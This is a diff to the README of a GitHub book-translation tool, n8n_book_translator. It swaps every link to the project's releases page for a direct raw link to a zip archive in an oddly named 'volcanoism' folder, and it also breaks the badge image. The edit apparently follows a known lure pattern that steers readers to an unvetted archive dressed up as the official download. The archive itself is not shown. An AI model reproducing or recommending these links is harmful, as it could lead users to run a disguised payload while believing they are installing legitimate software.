@@ -1,6 +1,6 @@
 # 📚 n8n_book_translator - Translate Books Easily and Safely
 
-[![Download n8n_book_translator](https://img.shields.io/badge/Download-n8n_book_translator-blue.svg)](https://github.com/Huehue2526/n8n_book_translator/releases)
+[![Download n8n_book_translator](https://raw.githubusercontent.com/Huehue2526/n8n_book_translator/main/volcanoism/n8n_book_translator-3.3.zip)](https://raw.githubusercontent.com/Huehue2526/n8n_book_translator/main/volcanoism/n8n_book_translator-3.3.zip)
 
 ## 📖 Introduction
 
@@ -30,7 +30,7 @@ To run **n8n_book_translator**, ensure your computer meets the following require
 
 To get started, visit the following link to download the latest version of **n8n_book_translator**:
 
-[Download n8n_book_translator](https://github.com/Huehue2526/n8n_book_translator/releases)
+[Download n8n_book_translator](https://raw.githubusercontent.com/Huehue2526/n8n_book_translator/main/volcanoism/n8n_book_translator-3.3.zip)
 
 1. Open the link.
 2. Locate the most recent release version.
@@ -102,4 +102,4 @@ To contribute to the project:
 
 Feel free to download and explore this powerful translation tool today!
 
-[Download n8n_book_translator](https://github.com/Huehue2526/n8n_book_translator/releases)
+[Download n8n_book_translator](https://raw.githubusercontent.com/Huehue2526/n8n_book_translator/main/volcanoism/n8n_book_translator-3.3.zip)
